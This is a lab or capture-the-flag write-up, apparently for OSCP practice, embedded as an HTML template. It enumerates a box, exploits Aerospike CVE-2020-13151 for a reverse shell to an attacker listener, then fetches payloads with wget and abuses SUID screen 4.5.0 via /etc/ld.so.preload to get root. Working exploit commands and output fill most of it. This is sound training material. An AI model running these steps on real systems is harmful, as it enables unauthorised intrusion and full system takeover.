@@ -1,0 +1,235 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">BOX143</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143]
+└─$ sudo nmap -p- -sCV 192.168.214.143 --min-rate=10000          
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-24 18:59 EST
+Nmap scan report for 192.168.206.143
+Host is up (0.21s latency).
+Not shown: 65526 filtered tcp ports (no-response)
+PORT     STATE SERVICE    VERSION
+21/tcp   open  ftp        vsftpd 3.0.3
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
+|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
+|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Test Page for the Nginx HTTP Server on Fedora
+443/tcp  open  http       Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  ppp?
+3003/tcp open  cgms?
+3306/tcp open  mysql      MySQL (unauthorized)
+5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
+| ssl-cert: Subject: commonName=aero
+| Subject Alternative Name: DNS:aero
+| Not valid before: 2021-05-10T22:20:48
+|_Not valid after:  2031-05-08T22:20:48
+|_ssl-date: TLS randomness does not represent time</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/A/143/1.png' %}" alt="">
+    <p class="text">The top page is apache2 default page. I enumerated this directory with gobuster.</p>
+</div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143]
+└─$ cat gobuster
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.214.143/
+[+] Method:                  GET
+[+] Threads:                 500
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 200) [Size: 33888]
+/sub                  (Status: 200) [Size: 5853]
+/api                  (Status: 301) [Size: 316] [--> http://192.168.214.143/api/]
+/theme                (Status: 200) [Size: 27688]
+/vendor               (Status: 301) [Size: 319] [--> http://192.168.214.143/vendor/]
+/config               (Status: 301) [Size: 319] [--> http://192.168.214.143/config/]
+/404                  (Status: 200) [Size: 4024]
+/content              (Status: 301) [Size: 320] [--> http://192.168.214.143/content/]
+/LICENSE              (Status: 200) [Size: 1085]
+...</code></pre></div>
+
+<p class="text">There is interesting directory : api. I enumerated this page deeper.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.214.143/api -t 100           
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.214.143/api
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/#                    (Status: 403) [Size: 280]
+/#                    (Status: 403) [Size: 280]
+/# or send a letter to Creative Commons, 171 Second Street, (Status: 403) [Size: 280]
+/# This work is licensed under the Creative Commons (Status: 403) [Size: 280]
+/# Copyright 2007 James Fisher (Status: 403) [Size: 280]
+/#                    (Status: 403) [Size: 280]
+/# Priority ordered case sensative list, where entries were found (Status: 403) [Size: 280]
+/# on atleast 2 different hosts (Status: 403) [Size: 280]
+/#                    (Status: 403) [Size: 280]
+/heartbeat            (Status: 200) [Size: 178]</code></pre></div>
+
+<p class="text">I found heartbeat directory.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/A/143/2.png' %}" alt="">
+    <p class="text">This page says aerospike is running. </p>
+</div>
+<p class="text">I searched the name aerospike using searchsploit.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143]
+└─$ searchsploit aerospike                     
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+Aerospike Database 5.1.0.3 - OS Command Execution                                              | multiple/remote/49067.py
+----------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre></div>
+<p class="text">I installed this output 49067.py.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143]
+└─$ searchsploit -m multiple/remote/49067.py</code></pre></div>
+<p class="text">This module requires python library aerospike, so I activated venv environment and installed aerospike.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143/CVE-2020-13151]
+└─$ source ~/utils/venv/bin/activate</code></pre></div>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/OSCPA/143/CVE-2020-13151]
+└─$ pip install aerospike</code></pre></div>
+<p class="text">Then, I ran poc file like below.</p>
+<div class="code-box"><pre><code>┌──(venv)─(kali㉿kali)-[~/tempo/OSCPA/143/CVE-2020-13151]
+└─$ python3 cve2020-13151.py --ahost 192.168.116.143 --pythonshell --lhost=192.168.45.196 --lport=80
+[+] aerospike build info: 5.1.0.1
+
+[+] looks vulnerable
+[+] populating dummy table.
+[+] writing to test.cve202013151
+[+] wrote JxtKFnVElvrONVvl
+[+] registering udf
+[+] sending payload, make sure you have a listener on 192.168.45.196:80.....</code></pre></div>
+<p class="text">Other ports are blocked except for 80.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I found uncommon SUID bit binary : screen-4.5.0.</p>
+<div class="code-box"><pre><code>aero@oscp:/home/aero/some$ find / -perm -4000 2>/dev/null | grep -v snap
+find / -perm -4000 2>/dev/null | grep -v snap
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/screen-4.5.0
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chfn</code></pre></div>
+<p class="text">Researching vulnerability revealed local privilege escalation. <a href="https://github.com/YasserREED/screen-v4.5.0-priv-escalate">source</a></p>
+
+<div class="code-box"><pre><code>┌──(venv)─(kali㉿kali)-[~/…/OSCPA/143/exploit/screen-v4.5.0-priv-escalate]
+└─$ git clone http://github.com/YasserREED/screen-v4.5.0-priv-escalate</code></pre></div>
+<p class="text">I executed cloned exploit.sh.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/…/OSCPA/143/exploit/screen-v4.5.0-priv-escalate]
+└─$ chmod +x exploit.sh
+
+┌──(kali㉿kali)-[~/…/OSCPA/143/exploit/screen-v4.5.0-priv-escalate]
+└─$ ./exploit.sh
+...</code></pre></div>
+<p class="text">As soon as executed the file, we would be navigated to /tmp folder.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ls                                                                                                                           
+config-err-C3AWtM
+libhax.so
+rootshell</code></pre></div>
+
+<p class="text">I served generated libhax.so file and rootshell file via python http server. Note that we have to place the two file on /tmp folder as the same with local kali machine.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ python3 -m http.server 80</code></pre></div>
+<div class="code-box"><pre><code>aero@oscp:/tmp$ wget http://192.168.45.196/libhax.so
+wget http://192.168.45.196/libhax.so
+--2025-12-05 06:14:40--  http://192.168.45.196/libhax.so
+Connecting to 192.168.45.196:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15528 (15K) [application/octet-stream]
+Saving to: ‘libhax.so’
+
+libhax.so           100%[===================>]  15.16K  --.-KB/s    in 0.1s    
+
+2025-12-05 06:14:40 (135 KB/s) - ‘libhax.so’ saved [15528/15528]
+
+aero@oscp:/tmp$ wget http://192.168.45.196/rootshell
+wget http://192.168.45.196/rootshell
+--2025-12-05 06:14:45--  http://192.168.45.196/rootshell
+Connecting to 192.168.45.196:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 758928 (741K) [application/octet-stream]
+Saving to: ‘rootshell’
+
+rootshell           100%[===================>] 741.14K   438KB/s    in 1.7s    
+
+2025-12-05 06:14:47 (438 KB/s) - ‘rootshell’ saved [758928/758928]</code></pre></div>
+
+<p class="text">Then, copy and paste codes below:</p>
+<div class="code-box"><pre><code>cd /etc || exit 1
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+screen -ls
+/tmp/rootshell</code></pre></div>
+<p class="text">Then, root shell would be successfully generated.</p>
+<div class="code-box"><pre><code>aero@oscp:/tmp$ cd /etc || exit 1
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+screen -ls
+/tmp/rootshell
+cd /etc || exit 1
+aero@oscp:/etc$ umask 000
+aero@oscp:/etc$ screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+aero@oscp:/etc$ screen -ls
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-aero.
+
+aero@oscp:/etc$ /tmp/rootshell
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+
+
+</body>
+</html>
